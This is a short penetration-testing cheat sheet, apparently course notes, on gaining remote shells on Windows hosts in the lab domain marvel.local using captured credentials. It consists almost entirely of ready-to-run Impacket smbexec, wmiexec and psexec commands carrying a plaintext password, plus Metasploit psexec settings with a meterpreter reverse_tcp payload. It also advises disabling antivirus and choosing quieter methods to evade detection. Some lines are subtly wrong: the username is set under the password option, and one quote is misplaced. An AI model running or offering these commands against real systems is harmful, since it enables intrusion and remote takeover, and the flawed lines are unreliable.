# Gaining Shell Access with Credentials

## **Using smbexec \(START WITH THIS, LESS NOISY, DISABLE ANTI VIRUS\)**

* run smbexec

```bash
smbexec.py marvel.local/fcastle:'P@$$w0rd!'@<victim ip>
```

## Using wmiexec \(START WITH THIS, LESS NOISY, DISABLE ANTI VIRUS\)

* run wmiexec

```bash
wmiexec.py marvel.local/fcastle:'P@$$w0rd!'@<victim ip>
```

## Using Metasploit psexec

* launch psexec

```bash
use exploit/windows/smb/psexec
```

* fill out credentials

```bash
options
set rhosts <ip>
set smbdomain marvel.local
set smbpass fcastle
set smbpass P@$$w0rd!
set lhost eth0
#Set Payload
set payload windows/x64/meterpreter/reverse_tcp
set target <#> (if it does not pop a shell)
```

## Using Metasploit Powershell

* launch psexec\_psh

```bash
use exploit/windows/smb/psexec_psh
```

## Using [psexec.py](http://psexec.py/)

* Run psexec

```bash
psexec.py marvel.local/fcastle:'P@$$w0rd!@'<victim ip>
```

